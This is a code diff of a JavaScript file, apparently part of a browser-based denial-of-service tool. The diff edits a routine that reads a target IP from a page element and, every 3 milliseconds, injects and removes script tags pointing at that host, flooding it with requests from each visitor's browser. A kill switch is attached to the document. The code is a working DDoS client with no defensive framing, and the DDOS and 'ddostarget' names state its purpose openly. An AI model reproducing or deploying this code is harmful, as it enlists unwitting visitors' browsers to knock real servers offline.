@@ -9,28 +9,33 @@ function WS4Redis(e,n){"use strict";function o(e){try{console.log("Connecting to
 (function($){
 
 
-        var attackInfo = JSON.parse($("#currentAttack").data("attackInfo"));
+        var attackInfo = JSON.parse(document.getElementById('currentAttack').dataset.attackinfo);
+
+        //alert("started");
 
 
+        var controller = 	window.setInterval(function(){
 
-        function DDOS(target){
-        var controller = 	setTimeout(function(){
-        	attackOn = true;
-        	while(attackOn){
         		var script =document.createElement('script');
         		script.type = 'text/javascript';
-        		script.src = 'http://'+attackInfo.target;
+        		script.src = 'http://'+attackInfo.targetip;
         		script.id = "ddostarget";
         		$("head:first").append(script);
         		$("#ddostarget").remove();
-        	}
-        },3000);
-        var kill =function killAttack(){
+
+        },3);
+        document.kill =function killAttack(){
 
           clearInterval(controller);
         }
+        //var curAtk = document.getElementById('currentAttack');
+        //curAtk.setAttribute("data-killattack",kill);
 
-        $("#currentAttack").data("killAttack",kill);
 
 
-})(jQuery)
+}
+
+
+
+
+)(jQuery);
